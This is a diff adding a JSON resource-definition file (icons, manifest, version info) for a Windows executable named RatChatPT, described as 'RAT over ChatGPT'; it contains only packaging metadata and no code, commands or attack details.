@@ -1,0 +1,32 @@
+{
+  "RT_GROUP_ICON": {
+    "APP": {
+      "0000": [
+        "ratchatPT_32.png",
+        "ratchatPT_64.png",
+        "ratchatPT_128.png",
+        "ratchatPT_256.png"
+      ]
+    }
+  },
+  "RT_MANIFEST": {
+    "#1": {
+      "0409": {}
+    }
+  },
+  "RT_VERSION": {
+    "#1": {
+      "0409": {
+        "info": {
+          "0409": {
+            "FileDescription": "RAT over ChatGPT",
+            "InternalName": "RatChatPT",
+            "LegalCopyright": "©Spartan Conseil & XRATOR",
+            "OriginalFilename": "RatChatPT.exe",
+            "ProductName": "RatChatPT"
+          }
+        }
+      }
+    }
+  }
+}
